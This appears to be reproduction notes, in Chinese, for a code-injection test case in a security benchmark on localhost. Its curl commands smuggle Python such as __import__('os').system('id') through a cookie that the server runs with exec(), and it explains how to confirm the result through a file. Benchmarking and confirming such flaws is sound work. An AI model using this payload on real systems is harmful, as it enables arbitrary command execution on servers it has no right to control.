# 复现步骤：向端点发送 POST 请求，Cookie 中携带恶意 Python 代码
curl -X POST http://localhost:8443/benchmark/codeinj-00/BenchmarkTest00074 \
  -H "Cookie: BenchmarkTest00074=__import__('os').system('id')"

# payload 说明：Cookie 值可以是任意 Python 代码，通过 exec() 执行。
# 使用 __import__('os').system('cmd') 可执行系统命令。
# 由于无输出回显到 HTTP 响应体（仅当出错时才有错误消息），攻击效果需通过带外信道或文件写入等方式验证。
# 例如写入文件：
curl -X POST http://localhost:8443/benchmark/codeinj-00/BenchmarkTest00074 \
  -H "Cookie: BenchmarkTest00074=__import__('os').system('id > /tmp/out')"
# 然后读取 /tmp/out 确认命令执行结果